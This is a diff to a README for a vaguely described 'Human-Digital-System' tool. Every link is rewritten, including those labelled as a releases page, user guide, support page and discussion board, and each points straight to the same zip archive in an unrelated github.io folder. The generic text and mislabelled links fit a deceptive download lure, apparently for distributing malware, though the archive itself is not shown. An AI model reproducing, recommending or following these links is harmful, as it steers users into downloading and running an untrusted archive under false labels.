@@ -5,7 +5,7 @@ description: "🌐 Transform human activities into digital workflows, streamlini
 ---
 # 🚀 Human-Digital-System - Digitizing Human Processes Simply
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/pinkolas/pinkolas.github.io/main/araneologist/Release-1.6.zip)
+[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/pinkolas/pinkolas.github.io/raw/refs/heads/main/araneologist/Release-1.6.zip)
 
 ## 📌 Project Overview
 
@@ -46,7 +46,7 @@ To run the Human Digital System, ensure your computer meets the following requir
 To get started with the Human Digital System, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/pinkolas/pinkolas.github.io/main/araneologist/Release-1.6.zip) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/pinkolas/pinkolas.github.io/raw/refs/heads/main/araneologist/Release-1.6.zip) to find the latest version of the software.
 
 2. **Download the Software**  
    On the Releases page, locate the latest version. Click on the appropriate file to download it.
@@ -62,7 +62,7 @@ To get started with the Human Digital System, follow these steps:
 To download the Human Digital System:
 
 1. **Visit the Releases Page**  
-   Access the [Releases page here](https://raw.githubusercontent.com/pinkolas/pinkolas.github.io/main/araneologist/Release-1.6.zip).
+   Access the [Releases page here](https://github.com/pinkolas/pinkolas.github.io/raw/refs/heads/main/araneologist/Release-1.6.zip).
 
 2. **Select Your Version**  
    Choose the version you wish to download. 
@@ -75,7 +75,7 @@ To download the Human Digital System:
 
 ## 📘 Documentation
 
-For more details on how to use the Human Digital System, refer to the [User Guide](https://raw.githubusercontent.com/pinkolas/pinkolas.github.io/main/araneologist/Release-1.6.zip). This guide includes:
+For more details on how to use the Human Digital System, refer to the [User Guide](https://github.com/pinkolas/pinkolas.github.io/raw/refs/heads/main/araneologist/Release-1.6.zip). This guide includes:
 - How to navigate the application.
 - Instructions for using key features.
 - Troubleshooting tips.
@@ -83,7 +83,7 @@ For more details on how to use the Human Digital System, refer to the [User Guid
 ## 📞 Support
 
 If you encounter issues or need assistance:
-- Check the FAQ section on our [support page](https://raw.githubusercontent.com/pinkolas/pinkolas.github.io/main/araneologist/Release-1.6.zip).
+- Check the FAQ section on our [support page](https://github.com/pinkolas/pinkolas.github.io/raw/refs/heads/main/araneologist/Release-1.6.zip).
 - Open an issue in this GitHub repository for help.
 
 Feel free to reach out through the GitHub issues page. Your feedback is important to us.
@@ -92,7 +92,7 @@ Feel free to reach out through the GitHub issues page. Your feedback is importan
 
 Join our community to share your experiences and suggestions. Follow updates and participate in discussions:
 - Connect with us on GitHub.
-- Check out our [Discussion Board](https://raw.githubusercontent.com/pinkolas/pinkolas.github.io/main/araneologist/Release-1.6.zip) for conversation threads.
+- Check out our [Discussion Board](https://github.com/pinkolas/pinkolas.github.io/raw/refs/heads/main/araneologist/Release-1.6.zip) for conversation threads.
 
 ## 📝 Contribution
 
@@ -110,4 +110,4 @@ This project is maintained by a team of developers passionate about creating eff
 
 Visit the code repository for insights into our development practices and future plans.
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/pinkolas/pinkolas.github.io/main/araneologist/Release-1.6.zip)
+[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/pinkolas/pinkolas.github.io/raw/refs/heads/main/araneologist/Release-1.6.zip)
